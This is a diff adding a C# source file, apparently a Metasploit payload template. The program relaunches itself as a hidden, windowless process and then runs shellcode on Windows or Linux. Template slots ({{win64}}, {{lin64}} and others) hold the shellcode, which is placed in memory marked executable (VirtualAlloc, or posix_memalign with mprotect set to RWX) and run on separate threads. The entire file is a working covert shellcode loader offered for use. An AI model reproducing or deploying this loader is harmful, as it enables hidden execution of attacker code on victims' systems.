@@ -1,0 +1,104 @@
+using System;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Diagnostics;
+
+namespace MetasploitPayload
+{
+    class MainClass
+    {
+        public static void Main (string[] args)
+		{
+			OperatingSystem os = Environment.OSVersion;
+			bool x86 = IntPtr.Size == 4;
+			byte[][] payload;
+
+			if (args.Length == 0) {
+				Process prc = Process.GetCurrentProcess();
+				Process p = new Process();
+				p.StartInfo = prc.StartInfo;
+				p.StartInfo.FileName = System.Reflection.Assembly.GetExecutingAssembly().Location;
+				p.StartInfo.Arguments = "1"; // this can be randomized
+				p.StartInfo.CreateNoWindow = true;
+				p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+
+				p.Start();
+			} else if (args[0] == "1") {
+				if (os.Platform == PlatformID.Win32Windows || os.Platform == PlatformID.Win32NT) {
+
+					if (!x86)
+						{{win64}}
+					else
+						{{win86}}
+			
+					foreach (byte[] code in payload) {
+						IntPtr ptr = VirtualAlloc (IntPtr.Zero, (IntPtr)code.Length, (IntPtr)0x1000, (IntPtr)0x40);
+						Marshal.Copy (code, 0, ptr, code.Length);
+						WindowsRun r = (WindowsRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(WindowsRun));
+					
+						Thread thread = new Thread(new ThreadStart(() => {
+							r ();
+						}));
+						thread.Start();
+						System.Threading.Thread.Sleep(500); 
+					}
+				} else if ((int)os.Platform == 4 || (int)os.Platform == 6 || (int)os.Platform == 128) { //linux
+
+					if (!x86)
+						{{lin64}}
+					else
+						{{lin86}}
+
+					foreach (byte[] code in payload) {
+						IntPtr ptr = IntPtr.Zero;
+						IntPtr success;
+
+						int pagesize = 4096;
+						IntPtr length = (IntPtr)(code.Length + pagesize - 1);
+						success = posix_memalign (ref ptr, (IntPtr)32, length);
+						if (success != IntPtr.Zero) {
+							Console.WriteLine ("Bail! memalign failed: " + success);
+							return;
+						}
+
+						IntPtr alignedPtr = (IntPtr)((int)ptr & ~(pagesize - 1)); //get page boundary
+						IntPtr mode = (IntPtr)(0x04 | 0x02 | 0x01); //RWX -- careful of selinux
+						success = mprotect (alignedPtr, (IntPtr)32, mode);
+						if (success != IntPtr.Zero) {
+							int err = Marshal.GetLastWin32Error ();
+							Console.WriteLine ("Bail! mprotect failed: " + err);
+							return;
+						}
+
+						Marshal.Copy (code, 0, ptr, code.Length);
+						LinuxRun r = (LinuxRun)Marshal.GetDelegateForFunctionPointer (ptr, typeof(LinuxRun));
+					
+						Thread thread = new Thread (new ThreadStart (() => {
+							r ();
+						}));
+						thread.Start ();
+						System.Threading.Thread.Sleep(500);
+					}
+				}
+			}
+        }
+
+        [DllImport("libc.so.6", SetLastError = true)]
+        private static extern IntPtr mprotect(IntPtr ptr, IntPtr length, IntPtr protection);
+
+        [DllImport("libc.so.6", SetLastError = true)]
+        private static extern IntPtr posix_memalign(ref IntPtr ptr, IntPtr alignment, IntPtr size);
+
+        [DllImport("libc.so.6", SetLastError = true)]
+        private static extern void free(IntPtr ptr);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr VirtualAlloc(IntPtr ptr, IntPtr size, IntPtr type, IntPtr mode);
+
+        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
+        private delegate void LinuxRun();
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        private delegate void WindowsRun();
+    }
+}
